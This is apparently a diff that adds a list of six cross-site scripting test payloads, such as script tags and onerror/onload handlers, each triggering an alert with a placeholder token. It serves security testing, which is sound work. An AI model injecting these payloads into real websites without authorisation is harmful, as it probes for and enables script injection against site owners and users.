@@ -1,0 +1,6 @@
+<script>alert('XSS_TOKEN')</script>
+<img src=x onerror=alert('XSS_TOKEN')>
+"><svg/onload=alert('XSS_TOKEN')>
+'><script>alert('XSS_TOKEN')</script>
+<body onload=alert('XSS_TOKEN')>
+<iframe src=javascript:alert('XSS_TOKEN')>
